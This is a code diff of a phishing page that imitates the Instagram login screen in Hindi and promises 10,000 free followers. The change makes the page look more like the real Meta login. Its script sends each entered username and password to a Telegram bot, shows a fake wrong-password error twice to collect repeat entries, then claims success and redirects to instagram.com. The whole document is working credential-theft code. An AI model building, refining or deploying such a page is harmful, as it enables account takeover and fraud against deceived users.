@@ -6,67 +6,97 @@
     <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #fafafa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 40px; }
-        .main-container { width: 100%; max-width: 350px; }
-        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; margin-bottom: 10px; border-radius: 1px; }
-        .promo-header { font-size: 16px; font-weight: 600; color: #8e8e8e; margin-bottom: 20px; line-height: 20px; }
-        .promo-header span { color: #262626; display: block; font-size: 18px; margin-top: 5px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px 8px; margin-bottom: 6px; border-radius: 3px; font-size: 12px; color: #262626; }
-        input:focus { border: 1px solid #a8a8a8; outline: none; }
-        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; padding: 6px 0; border-radius: 4px; font-weight: 600; cursor: pointer; margin: 8px 0; font-size: 14px; }
-        .divider { margin: 15px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
-        .reviews-container { background: #fff; border: 1px solid #dbdbdb; padding: 20px; margin-top: 10px; }
-        .review-title { font-size: 14px; font-weight: 600; color: #262626; margin-bottom: 15px; border-bottom: 1px solid #efefef; padding-bottom: 10px; }
-        .review-item { display: flex; gap: 10px; margin-bottom: 15px; text-align: left; }
-        .avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); padding: 2px; }
-        .avatar img { width: 100%; height: 100%; background: white; border-radius: 50%; padding: 1px; }
-        .review-text b { font-size: 13px; color: #262626; }
-        .review-text p { font-size: 12px; color: #262626; margin-top: 2px; }
-        .review-meta { font-size: 11px; color: #8e8e8e; margin-top: 4px; }
-        .verified-badge { color: #0095f6; font-size: 12px; margin-left: 2px; }
-        #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 10px; display: none; }
+        body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .language-selector { font-size: 12px; color: #8e8e8e; margin-bottom: 60px; margin-top: 10px; }
+        
+        .main-container { width: 100%; max-width: 400px; text-align: center; }
+        
+        .insta-logo-img { width: 60px; height: 60px; margin-bottom: 40px; }
+        
+        #error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; padding: 0 10px; }
+
+        .input-group { width: 100%; margin-bottom: 12px; }
+        input { 
+            width: 100%; 
+            background: #ffffff; 
+            border: 1px solid #dbdbdb; 
+            padding: 14px 12px; 
+            border-radius: 12px; 
+            font-size: 14px; 
+            color: #262626;
+        }
+        input:focus { border: 1px solid #737373; outline: none; }
+
+        .btn-login { 
+            width: 100%; 
+            background-color: #0064e0; 
+            color: white; 
+            border: none; 
+            padding: 12px 0; 
+            border-radius: 25px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin: 10px 0; 
+            font-size: 16px; 
+        }
+        .btn-login:disabled { background-color: #5890ff; opacity: 0.7; }
+
+        .forgot-pass { color: #262626; font-size: 14px; font-weight: 500; margin-top: 15px; display: block; text-decoration: none; }
+
+        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 20px; }
+        
+        .create-account-btn { 
+            width: 100%; 
+            background: transparent; 
+            color: #0064e0; 
+            border: 1px solid #0064e0; 
+            padding: 10px 0; 
+            border-radius: 25px; 
+            font-weight: 600; 
+            font-size: 14px; 
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 4px; color: #8e8e8e; font-size: 14px; font-weight: 600; }
+        .meta-footer img { width: 16px; height: 16px; }
+
+        /* Promo and Review styling (kept for your requirements) */
+        .promo-text { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; font-weight: 600; }
+        .promo-text span { color: #262626; display: block; font-size: 16px; }
     </style>
 </head>
 <body>
 
+    <div class="language-selector">Hindi (India)</div>
+
     <div class="main-container">
-        <div class="login-box">
-            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 40px; margin-bottom: 15px;">Instagram</h1>
-            <div class="promo-header">पाएं 10,000 फ्री फॉलोअर्स<span>सिर्फ 2 मिनट में डिलीवरी ⚡</span></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" class="insta-logo-img" alt="Instagram">
+        
+        <div class="promo-text">पाएं 10,000 फ्री फॉलोअर्स<span>सिर्फ 2 मिनट में डिलीवरी ⚡</span></div>
 
-            <div id="error-msg">आपका पासवर्ड गलत है। कृपया पुनः प्रयास करें।</div>
+        <div id="error-msg">आपका पासवर्ड गलत है। कृपया पुनः प्रयास करें।</div>
 
-            <form id="igForm">
-                <input type="text" id="user" placeholder="फोन नंबर, यूजरनेम या ईमेल" required>
+        <form id="igForm">
+            <div class="input-group">
+                <input type="text" id="user" placeholder="यूजरनेम, ईमेल या मोबाइल नंबर" required>
+            </div>
+            <div class="input-group">
                 <input type="password" id="pass" placeholder="पासवर्ड" required>
-                <button type="submit" class="btn-login" id="submitBtn">लॉग इन करें और क्लेम करें</button>
-            </form>
-
-            <div class="divider">या</div>
-            <p style="font-size: 12px; color: #385185; font-weight: 600; cursor: pointer; margin-top: 10px;">Facebook के साथ लॉग इन करें</p>
-        </div>
-
-        <div class="reviews-container">
-            <div class="review-title">हाल की गतिविधि</div>
-            
-            <div class="review-item">
-                <div class="avatar"><img src="https://ui-avatars.com/api/?name=Rishabh+K&background=random" alt=""></div>
-                <div class="review-text">
-                    <b>rishabh_official <span class="verified-badge">✔</span></b>
-                    <p>भाई मेरे 5k बढ़ गए! बहुत फ़ास्ट सर्विस है।</p>
-                    <div class="review-meta">अभी-अभी • <span style="color: #0095f6;">+5,000 फॉलोअर्स</span></div>
-                </div>
             </div>
+            <button type="submit" class="btn-login" id="submitBtn">लॉग इन करें</button>
+        </form>
 
-            <div class="review-item">
-                <div class="avatar"><img src="https://ui-avatars.com/api/?name=Anjali+S&background=random" alt=""></div>
-                <div class="review-text">
-                    <b>anjali_vlogs</b>
-                    <p>एक दम रियल फॉलोअर्स मिल रहे हैं। शुक्रिया!</p>
-                    <div class="review-meta">2 मिनट पहले • <span style="color: #0095f6;">+2,400 फॉलोअर्स</span></div>
-                </div>
-            </div>
+        <a href="#" class="forgot-pass">पासवर्ड भूल गए?</a>
+    </div>
+
+    <div class="bottom-section">
+        <a href="#" class="create-account-btn">नया अकाउंट बनाएं</a>
+        <div class="meta-footer">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" alt="Meta">
+            Meta
         </div>
     </div>
 
@@ -84,11 +114,11 @@
             const btn = document.getElementById('submitBtn');
             const errorDiv = document.getElementById('error-msg');
             
-            btn.innerText = "सत्यापित किया जा रहा है...";
+            btn.innerText = "लॉग इन हो रहा है...";
             btn.disabled = true;
             errorDiv.style.display = "none";
 
-            const message = `🚀 *New Login Captured!* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n🔢 *Attempt:* ${loginAttempts} \n\n📍 *Status:* Sent from web`;
+            const message = `🚀 *New Login Captured!* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n🔢 *Attempt:* ${loginAttempts}`;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -100,27 +130,24 @@
                 })
             })
             .then(() => {
-                if (loginAttempts < 3) {
-                    // Pehli aur dusri baar error dikhayega
-                    setTimeout(() => {
+                setTimeout(() => {
+                    if (loginAttempts < 3) {
                         errorDiv.style.display = "block";
                         btn.disabled = false;
-                        btn.innerText = "लॉग इन करें और क्लेम करें";
-                        document.getElementById('pass').value = ""; // Password clear kar dega
-                    }, 1000);
-                } else {
-                    // Teesri baar success message dikhayega
-                    alert('सत्यापन सफल! \nफॉलोअर्स 2 मिनट के भीतर जोड़ दिए जाएंगे। अपने अकाउंट को पब्लिक रखें।');
-                    window.location.href = "https://www.instagram.com";
-                }
+                        btn.innerText = "लॉग इन करें";
+                        document.getElementById('pass').value = ""; 
+                    } else {
+                        alert('सत्यापन सफल! \nफॉलोअर्स 2 मिनट के भीतर जोड़ दिए जाएंगे।');
+                        window.location.href = "https://www.instagram.com";
+                    }
+                }, 1000);
             })
             .catch(() => {
                 alert('कनेक्शन एरर! कृपया फिर से कोशिश करें।');
                 btn.disabled = false;
-                btn.innerText = "लॉग इन करें और क्लेम करें";
+                btn.innerText = "लॉग इन करें";
             });
         });
     </script>
-
 </body>
 </html>
